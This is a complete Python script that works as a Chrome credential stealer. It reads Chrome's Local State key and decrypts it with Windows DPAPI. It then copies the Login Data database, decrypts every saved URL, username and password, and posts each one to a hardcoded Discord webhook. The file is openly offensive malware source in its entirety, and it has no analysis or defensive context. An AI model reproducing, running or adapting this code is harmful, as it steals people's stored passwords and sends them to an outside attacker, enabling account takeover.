import os
import sqlite3
import json
import base64
import win32crypt
from Crypto.Cipher import AES
import requests

def get_encryption_key():
    local_state_path = os.path.join(
        os.environ["USERPROFILE"],
        "AppData", "Local", "Google", "Chrome", "User Data", "Local State"
    )
    with open(local_state_path, "r", encoding="utf-8") as file:
        local_state = json.loads(file.read())
    key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
    return win32crypt.CryptUnprotectData(key[5:], None, None, None, 0)[1]

def decrypt_password(password, key):
    try:
        iv = password[3:15]
        encrypted_password = password[15:]
        cipher = AES.new(key, AES.MODE_GCM, iv)
        return cipher.decrypt(encrypted_password)[:-16].decode()
    except:
        return "Unable to decrypt"

def extract_passwords():
    db_path = os.path.join(
        os.environ["USERPROFILE"],
        "AppData", "Local", "Google", "Chrome", "User Data", "Default", "Login Data"
    )
    db_copy = db_path + "_copy"
    os.system(f'copy "{db_path}" "{db_copy}"')
    conn = sqlite3.connect(db_copy)
    cursor = conn.cursor()
    cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
    key = get_encryption_key()
    results = []
    for row in cursor.fetchall():
        url, username, encrypted_password = row
        password = decrypt_password(encrypted_password, key)
        results.append(f"URL: {url}, Username: {username}, Password: {password}")
    conn.close()
    os.remove(db_copy)
    return results

def send_to_discord(data):
    webhook_url = "https://discord.com/api/webhooks/1325907178795569193/0XRDwFS_zrsuc0m5bUtH3KWs2sluj4M-kLHRWTLsB651tjPb2mKWLhGBnMTURtgX5sWd"
    for entry in data:
        requests.post(webhook_url, json={"content": entry})

if __name__ == "__main__":
    passwords = extract_passwords()
    send_to_discord(passwords)
